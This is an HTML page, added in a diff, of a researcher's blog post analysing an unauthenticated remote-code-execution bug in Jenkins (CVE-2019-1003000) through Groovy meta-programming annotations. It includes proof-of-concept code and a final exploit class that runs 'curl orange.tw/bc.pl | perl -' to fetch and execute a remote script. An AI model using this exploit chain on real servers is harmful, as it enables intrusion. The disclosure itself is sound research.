@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[ 繁體中文版本 | English Version ]    ChangeLog:  2019-02-22 updated   2019-05-10 updated   2019-05-10 released exploit code awesome-jenkins-rce-2019   2019-07-02 the slides is out!   Hello everyone!   This">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="[ 繁體中文版本 | English Version ]    ChangeLog:  2019-02-22 updated   2019-05-10 updated   2019-05-10 released exploit code awesome-jenkins-rce-2019   2019-07-02 the slides is out!   Hello everyone!   This">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/73138d7000a0a22d-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/222fd717701e01f1-02.png">
+<meta property="article:published_time" content="2019-02-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:18:49.801Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/73138d7000a0a22d-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-02-18T16:00:00.000Z" class="dt-published" itemprop="datePublished">2019-02-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>[ <a target="_blank" rel="noopener" href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">繁體中文版本</a> | <a href="#">English Version</a> ]</p>
+<p><img src="/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/73138d7000a0a22d-01.png" alt="preview">  </p>
+<p>ChangeLog:</p>
+<ul>
+<li>2019-02-22 <a href="#2019-02-22-updated">updated</a>  </li>
+<li>2019-05-10 <a href="#2019-05-10-updated">updated</a>  </li>
+<li>2019-05-10 released exploit code <a target="_blank" rel="noopener" href="https://github.com/orangetw/awesome-jenkins-rce-2019">awesome-jenkins-rce-2019</a>  </li>
+<li>2019-07-02 <a href="#2019-07-02-updated">the slides is out!</a></li>
+</ul>
+<hr>
+<p>Hello everyone!  </p>
+<p>This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!  </p>
+<ul>
+<li><a href="https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html">Hacking Jenkins Part 1 - Play with Dynamic Routing</a></li>
+</ul>
+<p>As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the <a target="_blank" rel="noopener" href="http://jenkins.local/script">Script Console</a>)! Although we could bypass the first ACL, we still can’t do much things :(  </p>
+<p>After Jenkins released the <a target="_blank" rel="noopener" href="https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595">Security Advisory</a> and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)  </p>
+<h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>First, we start from the Jenkins Pipeline to explain <a target="_blank" rel="noopener" href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">CVE-2019-1003000</a>! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)  </p>
+<p>In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!  </p>
+<p>As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JSON <span class="title function_">doCheckScriptCompile</span><span class="params">(<span class="meta">@QueryParameter</span> String value)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">CpsGroovyShell</span> <span class="variable">trusted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CpsGroovyShellFactory</span>(<span class="literal">null</span>).forTrusted().build();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CpsGroovyShellFactory</span>(<span class="literal">null</span>).withParent(trusted).build().getClassLoader().parseClass(value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CompilationFailedException x) &#123;</span><br><span class="line">        <span class="keyword">return</span> JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON();</span><br><span class="line">    <span class="comment">// Approval requirements are managed by regular stapler form validation (via doCheckScript)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>Here Jenkins validates the Pipeline with the method <a target="_blank" rel="noopener" href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">GroovyClassLoader.parseClass(…)</a>! It should be noted that this is just an AST parsing. Without running <code>execute()</code> method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any <code>execute()</code> method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!  </p>
+<h1 id="What-is-Meta-Programming"><a href="#What-is-Meta-Programming" class="headerlink" title="What is Meta-Programming"></a>What is Meta-Programming</h1><p>Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!  </p>
+<p>If it is still hard to understand, you can just regard <code>eval(...)</code> as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:  </p>
+<ul>
+<li>C Macro</li>
+<li>C++ Template</li>
+<li>Java Annotation</li>
+<li>Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)</li>
+<li>DSL(Domain Specific Languages, such as <a target="_blank" rel="noopener" href="http://sinatrarb.com/">Sinatra</a> and <a target="_blank" rel="noopener" href="https://gradle.org/">Gradle</a>)</li>
+</ul>
+<p>When we are talking about Meta-Programming, we classify it into <strong>(1)compile-time</strong> and <strong>(2)run-time Meta-Programming</strong> according to the scope. Today, we focus on the compile-time Meta-Programming!  </p>
+<p><em>P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Metaprogramming">Wiki</a>, <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561">Ref1</a>, <a target="_blank" rel="noopener" href="http://cs.lmu.edu/~ray/notes/metaprogramming/">Ref2</a></em><br><em>P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &lt;(_ _)&gt;</em>  </p>
+<h1 id="How-to-Exploit"><a href="#How-to-Exploit" class="headerlink" title="How to Exploit?"></a>How to Exploit?</h1><p>From the previous section we know Jenkins validates Pipeline by <a target="_blank" rel="noopener" href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">parseClass(…)</a> and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?  </p>
+<p>There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as he macro expansion in C language:  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e</span></span><br><span class="line">__int128 x[]=&#123;f,f,f,f,f,f,f,f&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>or the compiler resource bomb(make a 16GB ELF by just 18 bytes):  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main[<span class="number">-1u</span>]=&#123;<span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+
+<p>or calculating the Fibonacci number by compiler  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="type">int</span> n&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">fib</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = fib&lt;n<span class="number">-1</span>&gt;::value + fib&lt;n<span class="number">-2</span>&gt;::value;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt; <span class="keyword">struct</span> <span class="title class_">fib</span>&lt;<span class="number">0</span>&gt; &#123; <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">0</span>; &#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt; <span class="keyword">struct</span> <span class="title class_">fib</span>&lt;<span class="number">1</span>&gt; &#123; <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">1</span>; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = fib&lt;<span class="number">10</span>&gt;::value; <span class="comment">// 55</span></span><br><span class="line">    <span class="type">int</span> b = fib&lt;<span class="number">20</span>&gt;::value; <span class="comment">// 6765</span></span><br><span class="line">    <span class="type">int</span> c = fib&lt;<span class="number">40</span>&gt;::value; <span class="comment">// 102334155</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">g++ template.cpp -o template</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -d template</span></span><br><span class="line">...</span><br><span class="line">00000000000005fa &lt;main&gt;:</span><br><span class="line"> 5fa:   55                      push   rbp</span><br><span class="line"> 5fb:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR [rbp-0xc],0x37</span><br><span class="line"> 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR [rbp-0x8],0x1a6d</span><br><span class="line"> 60c:   c7 45 fc cb 7e 19 06    mov    DWORD PTR [rbp-0x4],0x6197ecb</span><br><span class="line"> 613:   b8 00 00 00 00          mov    eax,0x0</span><br><span class="line"> 618:   5d                      pop    rbp</span><br><span class="line"> 619:   c3                      ret</span><br><span class="line"> 61a:   66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+<p>For more examples, you can refer to the article <a target="_blank" rel="noopener" href="https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb">Build a Compiler Bomb</a> on StackOverflow!  </p>
+<h2 id="First-Attempt"><a href="#First-Attempt" class="headerlink" title="First Attempt"></a>First Attempt</h2><p>Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official <a target="_blank" rel="noopener" href="http://groovy-lang.org/metaprogramming.html">Meta-Programming manual</a> to find some exploitation ways. In the section 2.1.9, we found the <code>@groovy.transform.ASTTest</code> annotation. Here is its description:  </p>
+<blockquote>
+<p><code>@ASTTest</code> is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and <strong>perform assertions on the AST</strong> rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. <code>@ASTTest</code> can be placed on any annotable node and requires two parameters:</p>
+</blockquote>
+<p>What! <strong>perform assertions on the AST</strong>? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">def x</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">poc.groovy</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">groovy poc.groovy</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">poc.groovy  pwned</span><br></pre></td></tr></table></figure>
+
+
+<p>Cool, it works! However, while reproducing this on the remote Jenkins, it shows:  </p>
+<blockquote>
+<p>unable to resolve class org.jenkinsci.plugins.workflow.libs.Library</p>
+</blockquote>
+<p><img src="/posts/2019-02-abusing-meta-programming-for-unauthenticated-rce/222fd717701e01f1-02.png"></p>
+<p>What the hell!!! What’s wrong with that?  </p>
+<p>With a little bit digging, we found the root cause. This is caused by the <a target="_blank" rel="noopener" href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error <code>unsable to resolve class</code> occurs!  </p>
+<p>How to fix this problem? It’s simple! Just go to <a target="_blank" rel="noopener" href="http://jenkins.local/pluginManager/">Jenkins Plugin Manager</a> and remove the <a target="_blank" rel="noopener" href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!  </p>
+<h2 id="Second-Attempt"><a href="#Second-Attempt" class="headerlink" title="Second Attempt"></a>Second Attempt</h2><p>We continue reading the <a target="_blank" rel="noopener" href="http://groovy-lang.org/metaprogramming.html">Groovy Meta-Programming manual</a> and found another interesting annotation - <code>@Grab</code>. There is no detailed information about <code>@Grab</code> on the manual. However, we found another article - <a target="_blank" rel="noopener" href="http://docs.groovy-lang.org/latest/html/documentation/grape.html">Dependency management with Grape</a> on search engine!  </p>
+<p>Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Grab</span>(group=<span class="string">&#x27;org.springframework&#x27;</span>, module=<span class="string">&#x27;spring-orm&#x27;</span>, version=<span class="string">&#x27;3.2.5.RELEASE&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate</span><br></pre></td></tr></table></figure>
+
+
+<p>By using <code>@Grab</code> annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the <a target="_blank" rel="noopener" href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">PoC</a> proveded by <a target="_blank" rel="noopener" href="https://github.com/adamyordan">@adamyordan</a> to execute arbitrary commands!  </p>
+<p>However, without a valid credential and <code>execute()</code> method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about <code>@Grab</code>, we found another interesting annotation - <code>@GrabResolver</code>:  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">&#x27;restlet&#x27;</span>, root=<span class="string">&#x27;http://maven.restlet.org/&#x27;</span>)</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">&#x27;org.restlet&#x27;</span>, module=<span class="string">&#x27;org.restlet&#x27;</span>, version=<span class="string">&#x27;1.1.6&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> org.restlet</span><br></pre></td></tr></table></figure>
+
+
+<p>If you are smart enough, you would like to change the <code>root</code> parameter to a malicious website! Let’s try this in local environment:  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@GrabResolver(name=&#x27;restlet&#x27;, root=&#x27;http://orange.tw/&#x27;)</span></span><br><span class="line"><span class="string">@Grab(group=&#x27;org.restlet&#x27;, module=&#x27;org.restlet&#x27;, version=&#x27;1.1.6&#x27;)</span></span><br><span class="line"><span class="string">import org.restlet</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?  </p>
+<h1 id="The-Way-to-Code-Execution"><a href="#The-Way-to-Code-Execution" class="headerlink" title="The Way to Code Execution"></a>The Way to Code Execution</h1><p>In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?  </p>
+<p>By diving into <a target="_blank" rel="noopener" href="https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java">Grape implementation on Groovy</a>, we realized the library fetching is done by the class <a target="_blank" rel="noopener" href="https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy">groovy.grape.GrapeIvy</a>! We started to find is there any way we can leverage, and we noticed an interesting method <a target="_blank" rel="noopener" href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>!  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> processOtherServices(ClassLoader loader, File f) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ZipFile zf = <span class="keyword">new</span> ZipFile(f)</span><br><span class="line">        ZipEntry serializedCategoryMethods = zf.getEntry(<span class="string">&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (serializedCategoryMethods != <span class="literal">null</span>) &#123;</span><br><span class="line">            processSerializedCategoryMethods(zf.getInputStream(serializedCategoryMethods))</span><br><span class="line">        &#125;</span><br><span class="line">        ZipEntry pluginRunners = zf.getEntry(<span class="string">&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (pluginRunners != <span class="literal">null</span>) &#123;</span><br><span class="line">            processRunners(zf.getInputStream(pluginRunners), f.getName(), loader)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ZipException ignore) &#123;</span><br><span class="line">        <span class="comment">// ignore files we can&#x27;t process, e.g. non-jar/zip artifacts</span></span><br><span class="line">        <span class="comment">// TODO log a warning</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>JAR file is just a subset of ZIP format. In the <a target="_blank" rel="noopener" href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>, Grape registers servies if there are some specified entry points. Among them, the <code>Runner</code> interests me. By looking into the implementation of <a target="_blank" rel="noopener" href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335">processRunners(…)</a>, we found this:  </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> processRunners(InputStream is, String name, ClassLoader loader) &#123;</span><br><span class="line">    is.text.readLines().each &#123;</span><br><span class="line">        GroovySystem.RUNNER_REGISTRY[name] = loader.loadClass(it.trim()).newInstance()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>Here we see the <code>newInstance()</code>. Does it mean that we can call <code>Constructor</code> on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file <code>META-INF/services/org.codehaus.groovy.plugins.Runners</code> and we can invoke the <code>Constructor</code> and execute arbitrary code!  </p>
+<p>Here is the full exploit:  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Orange</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Orange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;curl orange.tw/bc.pl | perl -&quot;</span>;</span><br><span class="line">            String[] cmds = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, payload&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
